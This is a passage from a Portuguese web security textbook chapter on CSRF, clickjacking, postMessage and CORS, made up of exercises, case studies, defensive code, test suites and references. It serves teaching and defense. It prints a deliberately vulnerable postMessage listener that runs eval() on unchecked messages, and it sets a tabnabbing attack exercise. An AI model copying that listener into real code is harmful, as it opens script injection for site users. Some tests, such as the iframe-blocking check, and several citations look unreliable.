- Funcione tanto em browsers modernos quanto em versoes mais antigas

**Requisitos:**
- Documente cada diretiva e sua funcao
- Explique por que cada diretiva e necessaria
- Inclua o fallback X-Frame-Options

### Exercicio 3: Implementando PostMessage Seguro

Desenvolva um sistema de comunicacao seguro entre uma aplicacao pai e um widget em iframe:

**Requisitos:**
- Implemente handshake seguro com autenticacao
- Valide todas as mensagens recebidas
- Use schema de mensagens definido
- Implemente timeout para respostas
- Trate erros e tentativas de ataque

**Codigo esperado:**
- Classe `SecureMessageChannel` no lado do pai
- Classe `SecureWidget` no lado do iframe
- Testes unitarios

### Exercicio 4: Auditoria de CORS

Escreva um script que valide a configuracao CORS de um site:

**Requisitos:**
- Teste diferentes origens (legitima, maliciosa, wildcards)
- Verifique se credenciais sao permitidas corretamente
- Identifique configuracoes vulneraveis
- Gere um relatorio detalhado

**Funcionalidades:**
- Teste preflight requests
- Valide headers de resposta
- Detecte reflexao de origem
- Verifique metodos permitidos

### Exercicio 5: Protecao Completa contra Open Redirect

Implemente um sistema completo de redirecionamento seguro:

**Requisitos:**
- Whitelist de dominios permitidos
- Validacao de protocolo (apenas HTTPS)
- Protecao contra bypass com encoding
- Logging de tentativas de ataque
- Rate limiting por IP

**Adicionais:**
- Implemente em pelo menos 2 linguagens (JavaScript e Python)
- Inclua testes automatizados
- Documente os cenarios de ataque mitigados

### Exercicio 6: Analise de Window.opener Vulnerabilities

Crie uma demonstracao controlada de ataque tabnabbing e implemente as protecoes:

**Parte 1 - Ataque:**
- Crie uma pagina que demonstra como window.opener pode ser explorado
- Mostre como a aba original pode ser redirecionada
- Documente as implicacoes de seguranca

**Parte 2 - Defesa:**
- Implemente protecoes usando rel="noopener noreferrer"
- Crie um polyfill para navegadores antigos
- Adicione monitoramento de tentativas de ataque
- Implemente Content-Security-Policy adequada

---

## 6.14 Referencias

### Especificacoes e Padroes

1. OWASP. "Cross-Site Request Forgery Prevention Cheat Sheet." OWASP Foundation, 2023.
2. OWASP. "Clickjacking Defense Cheat Sheet." OWASP Foundation, 2023.
3. Mozilla Developer Network. "Content Security Policy (CSP)." MDN Web Docs, 2023.
4. MDN Web Docs. "HTTP X-Frame-Options Header." Mozilla Foundation, 2023.
5. RFC 6454. "The Web Origin Concept." Internet Engineering Task Force, 2011.
6. W3C. "Content Security Policy Level 3." World Wide Web Consortium, 2023.

### Artigos Tecnicos

7. Barth, A., Jackson, C., Mitchell, J.C. "Robust Defenses for Cross-Site Request Forgery." ACM Conference on Computer and Communications Security, 2008.
8. Huang, L.S., Evans, D., Chen, J. "How to Prevent Cross-site Request Forgery." ACM CCS Workshop on Security, 2009.
9. Ryck, K., Nelen, L., Desmet, L., Joosen, W., De Decker, B. "A Brief Tour of Fingerprinting Web Browsers." International Conference on Information Security, 2010.
10. Calzavara, L., Lucchese, A., Orzan, D., Vigevani, A., Focardi, R. "Finding Bugs in Same-Origin Policy Enforcement." USENIX Security Symposium, 2017.

### Documentacao de Frameworks

11. Django Project. "Cross Site Request Forgery protection." Django Documentation, 2023.
12. Express.js. "csurf: CSRF token middleware." Express.js Documentation, 2023.
13. Angular Team. "Security - Angular." Angular Documentation, 2023.
14. Helmet.js. "Helmet documentation." Helmet.js GitHub, 2023.

### Ferramentas

15. OWASP ZAP. "OWASP Zed Attack Proxy Project." OWASP Foundation, 2023.
16. Burp Suite. "Web Application Security Testing." PortSwigger, 2023.
17. DOMPurify. "DOMPurify - Client-side DOM XSS sanitization." GitHub, 2023.

### Seguranca Web Avancada

18. Stuttard, D., Pinto, M. "The Web Application Hacker's Handbook." Wiley, 2011.
19. Schneier, B. "Applied Cryptography." Wiley, 2015.
20. Mitchell, J.C. "Browser Security." Springer, 2023.

---

## 6.15 Casos de Estudo Reais

### 6.15.1 Caso 1: Ataque CSRF em Aplicacao Bancaria

Em 2019, uma instituicao financeira sofreu um ataque CSRF que permitiu transferencias nao autorizadas. O atacante explorou a ausencia de tokens CSRF em endpoints de API.

**Sequencia do ataque:**

1. O atacante identificou que o endpoint `/api/transfer` aceitava requisicoes POST sem validacao de token CSRF
2. O atacante criou uma pagina maliciosa com um formulario que enviava dados automaticamente
3. Um usuario logado visitou a pagina maliciosa
4. O navegador enviou automaticamente o cookie de sessao junto com a requisicao
5. A transferencia foi processada pelo servidor

**Impacto:**
- Perda financeira para os usuarios afetados
- Danos a reputacao da instituicao
- Multas regulatorias por falha de seguranca

**Licoes aprendidas:**
- Todos os endpoints que modificam dados devem exigir tokens CSRF
- APIs REST nao sao imunes a CSRF quando usam cookies para autenticacao
- Monitoramento de transacoes incomuns e essencial

### 6.15.2 Caso 2: Clickjacking em Rede Social

Uma rede social popular foi vitima de um ataque de clickjacking que fez usuarios seguirem contas automaticamente.

**Mecanismo do ataque:**

1. O atacante descobriu que a rede social nao usava X-Frame-Options ou CSP
2. Criou uma pagina com um jogo interativo sobreposta a um iframe da rede social
3. O botao de "jogar" estava alinhado com o botao de "seguir" na pagina oculta
4. Usuarios clicavam no jogo e, sem perceber, seguiam uma conta controlada pelo atacante

**Resposta da empresa:**

1. Implementacao imediata de X-Frame-Options com DENY
2. Adicao de CSP frame-ancestors para protecao adicional
3. Revisao de todos os endpoints que podem ser embutidos em iframes
4. Campanha de educacao de usuarios sobre seguranca

### 6.15.3 Caso 3: PostMessage Vulnerability em Widget de Terceiros

Um widget de chat incorporado por varios sites continha uma vulnerabilidade que permitia execucao remota de scripts.

**Vulnerabilidade:**

O widget escutava mensagens PostMessage sem validar a origem do remetente:

```javascript
// Codigo vulneravel no widget
window.addEventListener('message', (event) => {
    // Nenhuma validacao de origem
    if (event.data.type === 'execute') {
        eval(event.data.code);
    }
});
```

**Exploracao:**

1. O atacante identificou sites que usavam o widget
2. Criou uma pagina que enviava mensagens maliciosas para o widget
3. O widget executava o codigo recebido sem validacao
4. Isso permitia roubo de tokens de sessao e dados pessoais

**Correcao:**

1. Adicao de validacao estrita de origem
2. Remocao da funcao eval
3. Implementacao de schema de mensagens
4. Auditoria de seguranca em todos os integradores

---

## 6.16 Padroes Avancados de Protecao

### 6.16.1 Double Submit Cookie Pattern

O Double Submit Cookie Pattern e uma alternativa ao synchronizer token que nao requer armazenamento server-side. O token e enviado tanto no cookie quanto em um campo de formulario ou cabecalho.

**Implementacao em JavaScript:**

```javascript
// Gerar token aleatorio
function generateToken() {
    return Array.from(crypto.getRandomValues(new Uint8Array(32)))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

// Configurar cookie e campo de formulario
function setupCsrfProtection() {
    const token = generateToken();
    
    // Definir cookie (httpOnly: false para que JavaScript possa ler)
    document.cookie = `csrf_token=${token}; path=/; SameSite=Strict; Secure`;
    
    // Adicionar campo hidden em todos os formularios
    document.querySelectorAll('form').forEach(form => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'csrf_token';
        input.value = token;
        form.appendChild(input);
    });
    
    // Configurar cabecalho para requisicoes AJAX
    axios.defaults.headers.common['X-CSRF-Token'] = token;
}

// Validar no servidor (exemplo Node.js)
function validateDoubleSubmit(req, res, next) {
    const cookieToken = req.cookies.csrf_token;
    const headerToken = req.headers['x-csrf-token'] || req.body.csrf_token;
    
    if (!cookieToken || !headerToken) {
        return res.status(403).json({ error: 'CSRF token missing' });
    }
    
    // Comparacao segura contra timing attacks
    if (crypto.timingSafeEqual(
        Buffer.from(cookieToken),
        Buffer.from(headerToken)
    )) {
        return next();
    }
    
    return res.status(403).json({ error: 'CSRF token mismatch' });
}
```

**Vantagens:**
- Nao requer armazenamento server-side
- Funciona com arquiteturas stateless
- Facil implementacao em APIs REST

**Desvantagens:**
- Menos seguro que synchronizer token em alguns cenarios
- Depende da seguranca do cookie
- Pode ser afetado por ataques de injecao de cookies

### 6.16.2 Encrypted Token Pattern

O Encrypted Token Pattern usa criptografia para gerar tokens que contem informacoes sobre a sessao e sao validados sem armazenamento server-side.

**Implementacao:**

```javascript
const crypto = require('crypto');

class EncryptedCsrfToken {
    constructor(secret, options = {}) {
        this.secret = secret;
        this.algorithm = options.algorithm || 'aes-256-gcm';
        this.maxAge = options.maxAge || 3600000; // 1 hora
    }
    
    generate(sessionId, userId) {
        const payload = {
            sessionId,
            userId,
            timestamp: Date.now(),
            nonce: crypto.randomBytes(16).toString('hex')
        };
        
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(this.algorithm, this.secret, iv);
        
        let encrypted = cipher.update(JSON.stringify(payload), 'utf8', 'hex');
        encrypted += cipher.final('hex');
        
        const authTag = cipher.getAuthTag();
        
        return {
            token: encrypted,
            iv: iv.toString('hex'),
            authTag: authTag.toString('hex')
        };
    }
    
    validate(tokenData, sessionId, userId) {
        try {
            const { token, iv, authTag } = tokenData;
            
            const decipher = crypto.createDecipheriv(
                this.algorithm,
                this.secret,
                Buffer.from(iv, 'hex')
            );
            
            decipher.setAuthTag(Buffer.from(authTag, 'hex'));
            
            let decrypted = decipher.update(token, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            
            const payload = JSON.parse(decrypted);
            
            // Validar timestamp
            if (Date.now() - payload.timestamp > this.maxAge) {
                return { valid: false, reason: 'Token expired' };
            }
            
            // Validar sessao e usuario
            if (payload.sessionId !== sessionId || payload.userId !== userId) {
                return { valid: false, reason: 'Invalid session or user' };
            }
            
            return { valid: true, payload };
        } catch (error) {
            return { valid: false, reason: 'Invalid token' };
        }
    }
}

// Uso
const csrf = new EncryptedCsrfToken(process.env.CSRF_SECRET);
const tokenData = csrf.generate('session123', 'user456');
// Enviar tokenData para o cliente
```

### 6.16.3 Synchronizer Token com Rotacao

Para maior seguranca, o token CSRF pode ser rotacionado periodicamente:

```python
import secrets
import time
from datetime import datetime, timedelta

class CsrfTokenManager:
    def __init__(self, rotation_interval=3600):
        self.rotation_interval = rotation_interval
        self.tokens = {}  # session_id -> (token, created_at)
    
    def get_token(self, session_id):
        if session_id in self.tokens:
            token, created_at = self.tokens[session_id]
            if datetime.now() - created_at < timedelta(seconds=self.rotation_interval):
                return token
        
        # Gerar novo token
        new_token = secrets.token_hex(32)
        self.tokens[session_id] = (new_token, datetime.now())
        return new_token
    
    def validate_token(self, session_id, token):
        if session_id not in self.tokens:
            return False
        
        stored_token, created_at = self.tokens[session_id]
        
        # Verificar se o token expirou
        if datetime.now() - created_at > timedelta(seconds=self.rotation_interval):
            del self.tokens[session_id]
            return False
        
        # Comparacao segura
        return secrets.compare_digest(token, stored_token)
    
    def invalidate_token(self, session_id):
        if session_id in self.tokens:
            del self.tokens[session_id]
    
    def cleanup_expired(self):
        now = datetime.now()
        expired = [
            sid for sid, (_, created_at) in self.tokens.items()
            if now - created_at > timedelta(seconds=self.rotation_interval)
        ]
        for sid in expired:
            del self.tokens[sid]
```

---

## 6.17 Testes de Seguranca

### 6.17.1 Testes Automatizados para CSRF

```javascript
// Puppeteer test for CSRF
const puppeteer = require('puppeteer');

describe('CSRF Protection Tests', () => {
    let browser;
    let page;
    
    beforeAll(async () => {
        browser = await puppeteer.launch();
        page = await browser.newPage();
    });
    
    afterAll(async () => {
        await browser.close();
    });
    
    test('should require CSRF token for POST requests', async () => {
        await page.goto('http://localhost:3000/form');
        
        // Try to submit without CSRF token
        const response = await page.evaluate(async () => {
            const res = await fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: 'test' })
            });
            return { status: res.status, body: await res.json() };
        });
        
        expect(response.status).toBe(403);
        expect(response.body.error).toContain('CSRF');
    });
    
    test('should accept valid CSRF token', async () => {
        await page.goto('http://localhost:3000/form');
        
        const csrfToken = await page.evaluate(() => {
            return document.querySelector('input[name="csrf_token"]').value;
        });
        
        const response = await page.evaluate(async (token) => {
            const res = await fetch('/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': token
                },
                body: JSON.stringify({ data: 'test' })
            });
            return { status: res.status, body: await res.json() };
        }, csrfToken);
        
        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
    });
    
    test('should reject CSRF token from different origin', async () => {
        // Create malicious page
        await page.setContent(`
            <form id="csrf-form" action="http://localhost:3000/submit" method="POST">
                <input type="hidden" name="csrf_token" value="fake-token">
                <input type="hidden" name="data" value="malicious">
            </form>
        `);
        
        const response = await page.evaluate(async () => {
            const form = document.getElementById('csrf-form');
            const formData = new FormData(form);
            const res = await fetch('/submit', {
                method: 'POST',
                body: formData
            });
            return { status: res.status };
        });
        
        expect(response.status).toBe(403);
    });
});
```

### 6.17.2 Testes para Clickjacking

```javascript
// Test X-Frame-Options and CSP headers
const axios = require('axios');

describe('Clickjacking Protection Tests', () => {
    test('should set X-Frame-Options header', async () => {
        const response = await axios.get('http://localhost:3000/');
        expect(response.headers['x-frame-options']).toBe('DENY');
    });
    
    test('should set CSP frame-ancestors', async () => {
        const response = await axios.get('http://localhost:3000/');
        const csp = response.headers['content-security-policy'];
        expect(csp).toContain("frame-ancestors 'none'");
    });
    
    test('should prevent embedding in iframe', async () => {
        await page.goto('http://localhost:3000/');
        
        const canFrame = await page.evaluate(async () => {
            return new Promise((resolve) => {
                const iframe = document.createElement('iframe');
                iframe.src = 'http://localhost:3000/';
                iframe.onerror = () => resolve(false);
                iframe.onload = () => resolve(true);
                document.body.appendChild(iframe);
            });
        });
        
        expect(canFrame).toBe(false);
    });
});
```

### 6.17.3 Testes para PostMessage Security

```javascript
describe('PostMessage Security Tests', () => {
    test('should reject messages from unknown origins', async () => {
        await page.goto('http://localhost:3000/parent');
        
        const result = await page.evaluate(() => {
            return new Promise((resolve) => {
                // Create iframe
                const iframe = document.createElement('iframe');
                iframe.src = 'http://localhost:3001/child';
                document.body.appendChild(iframe);
                
                // Listen for response
                window.addEventListener('message', (event) => {
                    resolve(event.data);
                });
                
                // Send message from wrong origin (simulated)
                setTimeout(() => {
                    window.postMessage({
                        type: 'test',
                        data: 'malicious'
                    }, 'http://evil.com');
                }, 100);
            });
        });
        
        expect(result).toBeUndefined();
    });
    
    test('should validate message schema', async () => {
        await page.goto('http://localhost:3000/child');
        
        const result = await page.evaluate(() => {
            return new Promise((resolve) => {
                window.addEventListener('message', (event) => {
                    resolve(event.data);
                });
                
                // Send invalid message
                window.postMessage({
                    invalidField: 'test'
                }, window.location.origin);
            });
        });
        
        expect(result).toBeNull();
    });
});
```

### 6.17.4 Testes para CORS Configuration

```javascript
describe('CORS Configuration Tests', () => {
    test('should allow requests from trusted origins', async () => {
        const response = await axios.get('http://localhost:3000/api/data', {
            headers: { 'Origin': 'https://app.example.com' }
        });
        
        expect(response.headers['access-control-allow-origin']).toBe('https://app.example.com');
        expect(response.headers['access-control-allow-credentials']).toBe('true');
    });
    
    test('should reject requests from untrusted origins', async () => {
        const response = await axios.get('http://localhost:3000/api/data', {
            headers: { 'Origin': 'https://evil.com' }
        });
        
        expect(response.headers['access-control-allow-origin']).toBeUndefined();
    });
    
    test('should not allow wildcard with credentials', async () => {
        const response = await axios.get('http://localhost:3000/api/data', {
            headers: { 'Origin': 'https://evil.com' }
        });
        
        const allowOrigin = response.headers['access-control-allow-origin'];
        const allowCredentials = response.headers['access-control-allow-credentials'];
        
        if (allowOrigin === '*') {
            expect(allowCredentials).not.toBe('true');
        }
    });
});
```

---

## 6.18 Referencias Adicionais

### Livros

21. Grossman, J. "Anti-Hacking: Into the Next Generation." McGraw-Hill, 2007.
22. Howard, M., LeBlanc, D. "Writing Secure Code." Microsoft Press, 2002.
23. McGraw, G. "Software Security: Building Security In." Addison-Wesley, 2006.
24. Viega, J., McGraw, G. "Building Secure Software: How to Avoid Security Problems the Right Way." Addison-Wesley, 2001.

### Artigos Academicos

25. Johns, M. "Session-Safe JavaScript: Preventing Cross-Site Scripting Attacks by JavaScript Session Boundaries." Proceedings of the 2010 ACM Symposium on Information, Computer and Communications Security, 2010.
26. Van Oorschot, P.C., Ma, J. "Revisiting Cross-Origin Policies in Modern Browsers." Proceedings of the 2013 ACM SIGSAC Conference on Computer & Communications Security, 2013.
27. Calzavara, L., Focardi, R., Squarcina, M. "Cross-Origin Key-Value Stores: Attacks and Defenses." Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security, 2016.
28. Arni, T., Oktay, K., Salvaneschi, G. "A Survey on Cross-Site Scripting: Attacks, Detection, and Prevention." ACM Computing Surveys, 2022.

### Ferramentas de Auditoria

29. Snyk. "Web Application Security Scanner." Snyk Ltd., 2023.
30. Qualys. "Web Application Scanning." Qualys, Inc., 2023.
31. Acunetix. "Web Vulnerability Scanner." Acunetix, 2023.
32. Nessus. "Web Application Security Testing." Tenable, Inc., 2023.

### Comunidades e Recursos

33. OWASP. "Open Web Application Security Project." OWASP Foundation, 2023.
34. PortSwigger. "Web Security Academy." PortSwigger, 2023.
35. Google. "Google CTF (Capture The Flag)." Google, 2023.
36. HackTheBox. "Online Platform for Penetration Testing." HackTheBox, 2023.
